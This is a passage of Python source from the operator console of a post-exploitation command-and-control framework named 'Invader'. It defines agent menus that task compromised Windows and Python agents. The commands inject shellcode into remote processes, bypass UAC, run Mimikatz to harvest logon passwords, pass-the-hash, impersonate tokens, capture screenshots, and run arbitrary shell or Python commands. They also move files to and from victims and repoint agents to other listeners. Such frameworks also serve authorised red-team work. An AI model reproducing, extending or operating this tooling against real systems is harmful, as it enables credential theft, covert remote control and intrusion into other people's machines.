    def do_use(self, line):
        "Use an Invader PowerShell module."

        # Strip asterisks added by MainMenu.complete_use()
        module = "powershell/%s" %(line.strip().rstrip("*"))

        if module not in self.mainMenu.modules.modules:
            print helpers.color("[!] Error: invalid module")
        else:
            module_menu = ModuleMenu(self.mainMenu, module, agent=self.sessionID)
            module_menu.cmdloop()


    def do_search(self, line):
        "Search an Invader module (names/descriptions)."

        search_term = line.strip()

        if search_term.strip() == "":
            print helpers.color("[!] Please enter a search term.")
        else:
            self.mainMenu.modules.search_modules(search_term)


    def do_upp(self, line):
        "Update an agent connection profile."

        # profile format:
        #   TaskURI1,TaskURI2,...|UserAgent|OptionalHeader1,OptionalHeader2...

        profile = line.strip().strip()

        if profile != "":
            # load up a profile from a file if a path was passed
            if os.path.exists(profile):
                open_file = open(profile, 'r')
                profile = open_file.readlines()
                open_file.close()

                # strip out profile comments and blank lines
                profile = [l for l in profile if not l.startswith("#" and l.strip() != "")]
                profile = profile[0]

            if not profile.strip().startswith("\"/"):
                print helpers.color("[!] Task URIs in profiles must start with / and be enclosed in quotes!")
            else:
                updatecmd = "Update-Profile " + profile

                # task the agent to update their profile
                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", updatecmd)

                # dispatch this event
                message = "[*] Tasked agent to update profile {}".format(profile)
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

                # update the agent log
                msg = "Tasked agent to update profile " + profile
                self.mainMenu.agents.save_agent_log(self.sessionID, msg)

        else:
            print helpers.color("[*] Profile format is \"TaskURI1,TaskURI2,...|UserAgent|OptionalHeader2:Val1|OptionalHeader2:Val2...\"")

    def do_upc(self, line):
        "Dynamically update the agent comms to another listener."

        # generate comms for the listener selected
        if line:
            listenerID = line.strip()
            if not self.mainMenu.listeners.is_listener_valid(listenerID):
                print helpers.color("[!] Please enter a valid listenername.")
            else:
                activeListener = self.mainMenu.listeners.activeListeners[listenerID]
                if activeListener['moduleName'] != 'meterpreter' or activeListener['moduleName'] != 'http_mapi':
                    listenerOptions = activeListener['options']
                    listenerComms = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_comms(listenerOptions, language="powershell")

                    self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_UPDATE_LISTENERNAME", listenerOptions['Name']['Value'])
                    self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SWITCH_LISTENER", listenerComms)
                    
                    msg = "Tasked agent to update comms to %s listener" % listenerID
                    self.mainMenu.agents.save_agent_log(self.sessionID, msg)
                else:
                    print helpers.color("[!] Ineligible listener for updatecomms command: %s" % activeListener['moduleName'])

        else:
            print helpers.color("[!] Please enter a valid listenername.")

    def do_psinject(self, line):
        "Inject a launcher into a remote process."

        # get the info for the psinject module
        if line:

            if self.mainMenu.modules.modules['powershell/management/psinject']:

                module = self.mainMenu.modules.modules['powershell/management/psinject']
                listenerID = line.split(' ')[0].strip()
                module.options['Listener']['Value'] = listenerID

                if listenerID != '' and self.mainMenu.listeners.is_listener_valid(listenerID):
                    if len(line.split(' ')) == 2:
                        target = line.split(' ')[1].strip()
                        if target.isdigit():
                            module.options['ProcId']['Value'] = target
                            module.options['ProcName']['Value'] = ''
                        else:
                            module.options['ProcName']['Value'] = target
                            module.options['ProcId']['Value'] = ''

                    module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
                    module_menu = ModuleMenu(self.mainMenu, 'powershell/management/psinject')
                    module_menu.do_execute("")

                else:
                    print helpers.color("[!] Please enter <listenerName> <pid>")

            else:
                print helpers.color("[!] powershell/management/psinject module not loaded")

        else:
            print helpers.color("[!] Injection requires you to specify listener")


    def do_shinject(self, line):
        "Inject non-meterpreter listener shellcode into a remote process."

        if line:
            if self.mainMenu.modules.modules['powershell/management/shinject']:
                module = self.mainMenu.modules.modules['powershell/management/shinject']
                listenerID = line.split(' ')[0]
                arch = line.split(' ')[-1]
                module.options['Listener']['Value'] = listenerID
                module.options['Arch']['Value'] = arch

                if listenerID != '' and self.mainMenu.listeners.is_listener_valid(listenerID):
                    if len(line.split(' ')) == 3:
                        target = line.split(' ')[1].strip()
                        if target.isdigit():
                            module.options['ProcId']['Value'] = target
                        else:
                            print helpers.color('[!] Please enter a valid process ID.')

                    module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
                    module_menu = ModuleMenu(self.mainMenu, 'powershell/management/shinject')
                    module_menu.do_execute("")
                else:
                    print helpers.color('[!] Please select a valid listener')
            
            else:
                print helpers.color("[!] powershell/management/psinject module not loaded")
        
        else:
            print helpers.color("[!] Injection requires you to specify listener")

    def do_injectsh(self, line):
        "Inject listener shellcode into a remote process."

        # get the info for the inject module
        if line:
            listenerID = line.split(' ')[0].strip()
            pid = ''

            if len(line.split(' ')) == 2:
                pid = line.split(' ')[1].strip()

            if self.mainMenu.modules.modules['powershell/code_execution/invoke_shellcode']:

                if listenerID != '' and self.mainMenu.listeners.is_listener_valid(listenerID):

                    module = self.mainMenu.modules.modules['powershell/code_execution/invoke_shellcode']
                    module.options['Listener']['Value'] = listenerID
                    module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)

                    if pid != '':
                        module.options['ProcessID']['Value'] = pid

                    module_menu = ModuleMenu(self.mainMenu, 'powershell/code_execution/invoke_shellcode')
                    module_menu.cmdloop()

                else:
                    print helpers.color("[!] Please enter <listenerName> <pid>")

            else:
                print helpers.color("[!] powershell/code_execution/invoke_shellcode module not loaded")

        else:
            print helpers.color("[!] Injection requires you to specify listener")


    def do_sc(self, line):
        "Takes a screenshot, default is PNG."

        # get the info for the psinject module
        if len(line.strip()) > 0:
            # JPEG compression ratio
            try:
                screenshot_ratio = str(int(line.strip()))
            except Exception:
                print helpers.color("[*] JPEG Ratio incorrect. Has been set to 80.")
                screenshot_ratio = "80"
        else:
            screenshot_ratio = ''

        if self.mainMenu.modules.modules['powershell/collection/screenshot']:
            module = self.mainMenu.modules.modules['powershell/collection/screenshot']
            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
            module.options['Ratio']['Value'] = screenshot_ratio

            # execute the screenshot module
            module_menu = ModuleMenu(self.mainMenu, 'powershell/collection/screenshot')
            module_menu.do_execute("")

        else:
            print helpers.color("[!] powershell/collection/screenshot module not loaded")


    def do_spawn(self, line):
        "Spawns a new Invader agent for the given listener name."

        # get the info for the spawn module
        if line:
            listenerID = line.split(' ')[0].strip()

            if listenerID != '' and self.mainMenu.listeners.is_listener_valid(listenerID):

                # ensure the inject module is loaded
                if self.mainMenu.modules.modules['powershell/management/spawn']:
                    module = self.mainMenu.modules.modules['powershell/management/spawn']

                    module.options['Listener']['Value'] = listenerID
                    module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)

                    # jump to the spawn module
                    module_menu = ModuleMenu(self.mainMenu, "powershell/management/spawn")
                    module_menu.cmdloop()

                else:
                    print helpers.color("[!] management/spawn module not loaded")

            else:
                print helpers.color("[!] Please enter a valid listener name or ID.")

        else:
            print helpers.color("[!] Please specify a listener name or ID.")


    def do_bypassuac(self, line):
        "Runs BypassUAC, spawning a new high-integrity agent for a listener."

        # get the info for the bypassuac module
        if line:
            listenerID = line.split(' ')[0].strip()

            if listenerID != '' and self.mainMenu.listeners.is_listener_valid(listenerID):

                # ensure the inject module is loaded
                if self.mainMenu.modules.modules['powershell/privesc/bypassuac_eventvwr']:
                    module = self.mainMenu.modules.modules['powershell/privesc/bypassuac_eventvwr']

                    module.options['Listener']['Value'] = listenerID
                    module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)

                    # jump to the spawn module
                    module_menu = ModuleMenu(self.mainMenu, 'powershell/privesc/bypassuac_eventvwr')
                    module_menu.do_execute('')

                else:
                    print helpers.color("[!] powershell/privesc/bypassuac_eventvwr module not loaded")

            else:
                print helpers.color("[!] Please enter a valid listener name or ID.")

        else:
            print helpers.color("[!] Please specify a listener name or ID.")


    def do_mimikatz(self, line):
        "Runs Invoke-Mimikatz on the client."

        # ensure the credentials/mimiktaz/logonpasswords module is loaded
        if self.mainMenu.modules.modules['powershell/credentials/mimikatz/logonpasswords']:
            module = self.mainMenu.modules.modules['powershell/credentials/mimikatz/logonpasswords']

            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)

            # execute the Mimikatz module
            module_menu = ModuleMenu(self.mainMenu, 'powershell/credentials/mimikatz/logonpasswords')
            module_menu.do_execute('')


    def do_pth(self, line):
        "Executes PTH for a CredID through Mimikatz."

        credID = line.strip()

        if credID == '':
            print helpers.color("[!] Please specify a <CredID>.")
            return

        if self.mainMenu.modules.modules['powershell/credentials/mimikatz/pth']:
            # reload the module to reset the default values
            module = self.mainMenu.modules.reload_module('powershell/credentials/mimikatz/pth')

            module = self.mainMenu.modules.modules['powershell/credentials/mimikatz/pth']

            # set mimikt/pth to use the given CredID
            module.options['CredID']['Value'] = credID

            # set the agent ID
            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)

            # execute the mimikatz/pth module
            module_menu = ModuleMenu(self.mainMenu, 'powershell/credentials/mimikatz/pth')
            module_menu.do_execute('')


    def do_stkn(self, line):
        "Use credentials/tokens to impersonate a token for a given process ID."

        processID = line.strip()

        if processID == '':
            print helpers.color("[!] Please specify a process ID.")
            return

        if self.mainMenu.modules.modules['powershell/credentials/tokens']:
            # reload the module to reset the default values
            module = self.mainMenu.modules.reload_module('powershell/credentials/tokens')

            module = self.mainMenu.modules.modules['powershell/credentials/tokens']

            # set credentials/token to impersonate the given process ID token
            module.options['ImpersonateUser']['Value'] = 'True'
            module.options['ProcessID']['Value'] = processID

            # set the agent ID
            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)

            # execute the token module
            module_menu = ModuleMenu(self.mainMenu, 'powershell/credentials/tokens')
            module_menu.do_execute('')

            # run a sysinfo to update
            self.do_sysinfo(line)


    def do_revtoself(self, line):
        "Use credentials/tokens to revert token privileges."

        if self.mainMenu.modules.modules['powershell/credentials/tokens']:
            # reload the module to reset the default values
            module = self.mainMenu.modules.reload_module('powershell/credentials/tokens')

            module = self.mainMenu.modules.modules['powershell/credentials/tokens']

            # set credentials/token to revert to self
            module.options['RevToSelf']['Value'] = "True"

            # set the agent ID
            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)

            # execute the token module
            module_menu = ModuleMenu(self.mainMenu, "powershell/credentials/tokens")
            module_menu.do_execute('')

            # run a sysinfo to update
            self.do_sysinfo(line)


    def do_creds(self, line):
        "Display/return database credentials."
        self.mainMenu.do_creds(line)

    def complete_upc(self, text, line, begidx, endidx):
        "Tab-complete upc option values."

        return self.complete_psinject(text, line, begidx, endidx)

    def complete_shinject(self, text, line, begidx, endidx):
        "Tab-complete psinject option values."

        return self.complete_psinject(text, line, begidx, endidx)

    def complete_psinject(self, text, line, begidx, endidx):
        "Tab-complete psinject option values."

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in self.mainMenu.listeners.get_listener_names() if s.startswith(mline)]


    def complete_injectsh(self, text, line, begidx, endidx):
        "Tab-complete injectsh option values."

        return self.complete_psinject(text, line, begidx, endidx)


    def complete_spawn(self, text, line, begidx, endidx):
        "Tab-complete spawn option values."

        return self.complete_psinject(text, line, begidx, endidx)


    def complete_bypassuac(self, text, line, begidx, endidx):
        "Tab-complete bypassuac option values."

        return self.complete_psinject(text, line, begidx, endidx)


    def complete_jobs(self, text, line, begidx, endidx):
        "Tab-complete jobs management options."

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in ["kill"] if s.startswith(mline)]


    def complete_sci(self, text, line, begidx, endidx):
        "Tab-complete a PowerShell script path."

        return helpers.complete_path(text, line)


    def complete_scmd(self, text, line, begidx, endidx):
        "Tab-complete a script cmd set."

        functions = self.mainMenu.agents.get_agent_functions(self.sessionID)

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in functions if s.startswith(mline)]


    def complete_use(self, text, line, begidx, endidx):
        "Tab-complete an Invader PowerShell module path."
        return self.mainMenu.complete_use(text, line, begidx, endidx, language='powershell')


    def complete_upload(self, text, line, begidx, endidx):
        "Tab-complete an upload file path."
        return helpers.complete_path(text, line)


    def complete_upp(self, text, line, begidx, endidx):
        "Tab-complete an upp path."
        return helpers.complete_path(text, line)


    def complete_creds(self, text, line, begidx, endidx):
        "Tab-complete 'creds' commands."
        return self.mainMenu.complete_creds(text, line, begidx, endidx)


class PythonAgentMenu(SubMenu):

    def __init__(self, mainMenu, sessionID):

        SubMenu.__init__(self, mainMenu)

        self.sessionID = sessionID

        self.doc_header = 'Agent Commands'

        dispatcher.connect(self.handle_agent_event, sender=dispatcher.Any)

        # try to resolve the sessionID to a name
        name = self.mainMenu.agents.get_agent_name_db(sessionID)

        # set the text prompt
        self.prompt = '(Invader: ' + helpers.color(name, 'red') + ')> '

        # listen for messages from this specific agent
        #dispatcher.connect(self.handle_agent_event, sender=dispatcher.Any)

        # agent commands that have opsec-safe alises in the agent code
        self.agentCommands = ['ls', 'rm', 'pwd', 'mkdir', 'whoami', 'getuid', 'hostname']

        # display any results from the database that were stored
        # while we weren't interacting with the agent
        results = self.mainMenu.agents.get_agent_results_db(self.sessionID)
        if results:
            print "\n" + results.rstrip('\r\n')

    def handle_agent_event(self, signal, sender):
        """
        Handle agent event signals
        """
        # load up the signal so we can inspect it
        try:
            signal_data = json.loads(signal)
        except ValueError:
            print(helpers.color("[!] Error: bad signal recieved {} from sender {}".format(signal, sender)))
            return

        if '{} returned results'.format(self.sessionID) in signal:
            results = self.mainMenu.agents.get_agent_results_db(self.sessionID)
            if results:
                print(helpers.color(results))

    def default(self, line):
        "Default handler."
        line = line.strip()
        parts = line.split(' ')

        if len(parts) > 0:
            # check if we got an agent command
            if parts[0] in self.agentCommands:
                shellcmd = ' '.join(parts)
                # task the agent with this shell command
                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", shellcmd)
                # update the agent log
                msg = "Tasked agent to run command " + line
                self.mainMenu.agents.save_agent_log(self.sessionID, msg)
            else:
                print helpers.color("[!] Command not recognized.")
                print helpers.color("[*] Use 'help' or 'help agentcmds' to see available commands.")

    def do_help(self, *args):
        "Displays the help menu or syntax for particular commands."
        SubMenu.do_help(self, *args)


    def do_list(self, line):
        "Lists all active agents (or listeners)."

        if line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(' '.join(line.split(' ')[1:])))
        elif line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(' '.join(line.split(' ')[1:])))
        else:
            print helpers.color("[!] Please use 'list [agents/listeners] <modifier>'.")


    def do_rename(self, line):
        "Rename the agent."

        parts = line.strip().split(' ')
        oldname = self.mainMenu.agents.get_agent_name_db(self.sessionID)

        # name sure we get a new name to rename this agent
        if len(parts) == 1 and parts[0].strip() != '':
            # replace the old name with the new name
            result = self.mainMenu.agents.rename_agent(oldname, parts[0])
            if result:
                self.prompt = "(Invader: " + helpers.color(parts[0], 'red') + ")> "
        else:
            print helpers.color("[!] Please enter a new name for the agent")


    def do_info(self, line):
        "Display information about this agent."

        # get the agent name, if applicable
        agent = self.mainMenu.agents.get_agent_db(self.sessionID)
        messages.display_agent(agent)


    def do_exit(self, line):
        "Task agent to exit."

        try:
            choice = raw_input(helpers.color("[?] Task agent to exit? [y/N] ", "red"))
            if choice.lower() == "y":

                self.mainMenu.agents.add_agent_task_db(self.sessionID, 'TASK_EXIT')

                # dispatch this event
                message = "[*] Tasked agent to exit"
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

                # update the agent log
                self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to exit")
                raise NavAgents

        except KeyboardInterrupt as e:
            print ""


    def do_clear(self, line):
        "Clear out agent tasking."
        self.mainMenu.agents.clear_agent_tasks_db(self.sessionID)


    def do_cd(self, line):
        "Change an agent's active directory."

        line = line.strip()

        if line != "":
            # have to be careful with inline python and no threading
            # this can cause the agent to crash so we will use try / cath
            # task the agent with this shell command
            if line == "..":
                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", 'import os; os.chdir(os.pardir); print "Directory stepped down: %s"' % (line))
            else:
                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", 'import os; os.chdir("%s"); print "Directory changed to: %s"' % (line, line))

            # dispatch this event
            message = "[*] Tasked agent to change active directory to {}".format(line)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            msg = "Tasked agent to change active directory to: %s" % (line)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_jobs(self, line):
        "Return jobs or kill a running job."

        parts = line.split(' ')

        if len(parts) == 1:
            if parts[0] == '':
                self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_GETJOBS")

                # dispatch this event
                message = "[*] Tasked agent to get running jobs"
                signal = json.dumps({
                    'print': False,
                    'message': message
                })
                dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

                # update the agent log
                self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get running jobs")
            else:
                print helpers.color("[!] Please use form 'jobs kill JOB_ID'")
        elif len(parts) == 2:
            jobID = parts[1].strip()
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_STOPJOB", jobID)

            # dispatch this event
            message = "[*] Tasked agent to get stop job {}".format(jobID)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to stop job " + str(jobID))


    def do_sleep(self, line):
        "Task an agent to sleep."

        parts = line.strip().split(' ')
        delay = parts[0]

        # make sure we pass a int()
        if len(parts) >= 1:
            try:
                int(delay)
            except:
                print helpers.color("[!] Please only enter integer for 'interval'")
                return

        if len(parts) > 1:
            try:
                int(parts[1])
            except:
                print helpers.color("[!] Please only enter integer for '[jitter]'")
                return

        if delay == "":
            # task the agent to display the delay/jitter
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global delay; global jitter; print 'delay/jitter = ' + str(delay)+'/'+str(jitter)")

            # dispatch this event
            message = "[*] Tasked agent to display delay/jitter"
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to display delay/jitter")

        elif len(parts) > 0 and parts[0] != "":
            delay = parts[0]
            jitter = 0.0
            if len(parts) == 2:
                jitter = parts[1]

            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field_db("delay", delay, self.sessionID)
            self.mainMenu.agents.set_agent_field_db("jitter", jitter, self.sessionID)

            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global delay; global jitter; delay=%s; jitter=%s; print 'delay/jitter set to %s/%s'" % (delay, jitter, delay, jitter))

            # dispatch this event
            message = "[*] Tasked agent to delay sleep/jitter {}/{}".format(delay, jitter)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            msg = "Tasked agent to delay sleep/jitter " + str(delay) + "/" + str(jitter)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_lostlimit(self, line):
        "Task an agent to display change the limit on lost agent detection."

        parts = line.strip().split(' ')
        lostLimit = parts[0]

        if lostLimit == "":
            # task the agent to display the lostLimit
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global lostLimit; print 'lostLimit = ' + str(lostLimit)")

            # dispatch this event
            message = "[*] Tasked agent to display lost limit"
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to display lost limit")
        else:
            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field_db("lost_limit", lostLimit, self.sessionID)

            # task the agent with the new lostLimit
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global lostLimit; lostLimit=%s; print 'lostLimit set to %s'"%(lostLimit, lostLimit))

            # dispatch this event
            message = "[*] Tasked agent to change lost limit {}".format(lostLimit)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            msg = "Tasked agent to change lost limit " + str(lostLimit)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_killdate(self, line):
        "Get or set an agent's killdate (01/01/2016)."

        parts = line.strip().split(' ')
        killDate = parts[0]

        if killDate == "":

            # task the agent to display the killdate
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global killDate; print 'killDate = ' + str(killDate)")

            # dispatch this event
            message = "[*] Tasked agent to display killDate"
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to display killDate")
        else:
            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field_db("kill_date", killDate, self.sessionID)

            # task the agent with the new killDate
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global killDate; killDate='%s'; print 'killDate set to %s'" % (killDate, killDate))

            # dispatch this event
            message = "[*] Tasked agent to set killDate to {}".format(killDate)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            msg = "Tasked agent to set killdate to %s" %(killDate)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_wkhours(self, line):
        "Get or set an agent's working hours (9:00-17:00)."

        parts = line.strip().split(' ')
        hours = parts[0]

        if hours == "":
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global workingHours; print 'workingHours = ' + str(workingHours)")

            # dispatch this event
            message = "[*] Tasked agent to get working hours"
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get working hours")

        else:
            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field_db("working_hours", hours, self.sessionID)

            # task the agent with the new working hours
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", "global workingHours; workingHours= '%s'"%(hours))

            # dispatch this event
            message = "[*] Tasked agent to set working hours to {}".format(hours)
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            msg = "Tasked agent to set working hours to: %s" % (hours)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_shell(self, line):
        "Task an agent to execute a shell command."

        line = line.strip()

        if line != "":
            # task the agent with this shell command
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SHELL", str(line))

            # dispatch this event
            message = "[*] Tasked agent to run shell command: {}".format(line)
            signal = json.dumps({
                'print': False,
                'message': message,
                'command': line
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            msg = "Tasked agent to run shell command: %s" % (line)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

    def do_python(self, line):
        "Task an agent to execute a Python command."

        line = line.strip()

        if line != "":
            # task the agent with this shell command
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", str(line))

            # dispatch this event
            message = "[*] Tasked agent to run Python command: {}".format(line)
            signal = json.dumps({
                'print': False,
                'message': message,
                'command': line
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            msg = "Tasked agent to run Python command: %s" % (line)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

    def do_pys(self, line):
        "Load and execute a Python script."
        path = line.strip()

        if os.path.splitext(path)[-1] == '.py' and os.path.isfile(path):
            filename = os.path.basename(path).rstrip('.py')
            open_file = open(path, 'r')
            script = open_file.read()
            open_file.close()
            script = script.replace('\r\n', '\n')
            script = script.replace('\r', '\n')
            encScript = base64.b64encode(script)
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SCRIPT_COMMAND", encScript)

            # dispatch this event
            message = "[*] Tasked agent to execute Python script: {}".format(filename)
            signal = json.dumps({
                'print': True,
                'message': message,
                'script_name': filename,
                # note md5 is after replacements done on \r and \r\n above
                'script_md5': hashlib.md5(script).hexdigest()
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            #update the agent log
            msg = "[*] Tasked agent to execute python script: "+filename
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)
        else:
            print helpers.color("[!] Please provide a valid path", color="red")


    def do_sysinfo(self, line):
        "Task an agent to get system information."

        # task the agent with this shell command
        self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_SYSINFO")

        # dispatch this event
        message = "[*] Tasked agent to get system information"
        signal = json.dumps({
            'print': False,
            'message': message
        })
        dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

        # update the agent log
        self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get system information")


    def do_download(self, line):
        "Task an agent to download a file."

        line = line.strip()

        if line != "":
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_DOWNLOAD", line)

            # dispatch this event
            message = "[*] Tasked agent to download: {}".format(line)
            signal = json.dumps({
                'print': False,
                'message': message,
                'download_filename': line
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            msg = "Tasked agent to download: %s" % (line)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)


    def do_upload(self, line):
        "Task an agent to upload a file."

        # "upload /path/file.ext" or "upload /path/file/file.ext newfile.ext"
        # absolute paths accepted
        parts = line.strip().split(' ')
        uploadname = ""

        if len(parts) > 0 and parts[0] != "":
            if len(parts) == 1:
                # if we're uploading the file with its original name
                uploadname = os.path.basename(parts[0])
            else:
                # if we're uploading the file as a different name
                uploadname = parts[1].strip()

            if parts[0] != "" and os.path.exists(parts[0]):
                # TODO: reimplement Python file upload

                # # read in the file and base64 encode it for transport
                f = open(parts[0], 'r')
                fileData = f.read()
                f.close()
                # Get file size
                size = os.path.getsize(parts[0])
                if size > 1048576:
                    print helpers.color("[!] File size is too large. Upload limit is 1MB.")
                else:
                    print helpers.color("[*] Original tasked size of %s for upload: %s" %(uploadname, helpers.get_file_size(fileData)), color="green")

                    original_md5 = hashlib.md5(fileData).hexdigest()
                    # update the agent log with the filename and MD5
                    msg = "Tasked agent to upload " + parts[0] + " : " + original_md5
                    self.mainMenu.agents.save_agent_log(self.sessionID, msg)

                    # compress data before we base64
                    c = compress.compress()
                    start_crc32 = c.crc32_data(fileData)
                    comp_data = c.comp_data(fileData, 9)
                    fileData = c.build_header(comp_data, start_crc32)
                    # get final file size
                    fileData = helpers.encode_base64(fileData)
                    # upload packets -> "filename | script data"
                    data = uploadname + "|" + fileData

                    # dispatch this event
                    message = "[*] Starting upload of {}, final size {}".format(uploadname, helpers.get_file_size(fileData))
                    signal = json.dumps({
                        'print': True,
                        'message': message,
                        'upload_name': uploadname,
                        'upload_md5': original_md5,
                        'upload_size': helpers.get_file_size(fileData)
                    })
                    dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

                    self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_UPLOAD", data)
            else:
                print helpers.color("[!] Please enter a valid file path to upload")


    def do_use(self, line):
        "Use an Invader Python module."

        # Strip asterisks added by MainMenu.complete_use()
        module = "python/%s" %(line.strip().rstrip("*"))


        if module not in self.mainMenu.modules.modules:
            print helpers.color("[!] Error: invalid module")
        else:
            module_menu = ModuleMenu(self.mainMenu, module, agent=self.sessionID)
            module_menu.cmdloop()


    def do_search(self, line):
        "Search an Invader module (names/descriptions)."

        searchTerm = line.strip()

        if searchTerm.strip() == "":
            print helpers.color("[!] Please enter a search term.")
        else:
            self.mainMenu.modules.search_modules(searchTerm)

    def do_osxsc(self, line):
        "Use the Python-MSS module to take a screenshot."

        if self.mainMenu.modules.modules['python/collection/osx/native_screenshot']:
            module = self.mainMenu.modules.modules['python/collection/osx/native_screenshot']
            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name_db(self.sessionID)
            #execute screenshot module
            msg = "[*] Tasked agent to take a screenshot"
            module_menu = ModuleMenu(self.mainMenu, 'python/collection/osx/native_screenshot')
            print helpers.color(msg, color="green")
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

            # dispatch this event
            message = "[*] Tasked agent to take a screenshot"
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            module_menu.do_execute("")
        else:
            print helpers.color("[!] python/collection/osx/screenshot module not loaded")

    def do_cat(self, line):
        "View the contents of a file."

        if line != "":

            cmd = """
try:
    output = ""
    with open("%s","r") as f:
        for line in f:
            output += line

    print output
except Exception as e:
    print str(e)
""" % (line)
            # task the agent with this shell command
            self.mainMenu.agents.add_agent_task_db(self.sessionID, "TASK_CMD_WAIT", str(cmd))

            # dispatch this event
            message = "[*] Tasked agent to cat file: {}".format(line)
            signal = json.dumps({
                'print': False,
                'message': message,
                'file_name': line
            })
            dispatcher.send(signal, sender="agents/{}".format(self.sessionID))

            # update the agent log
            msg = "Tasked agent to cat file %s" % (line)
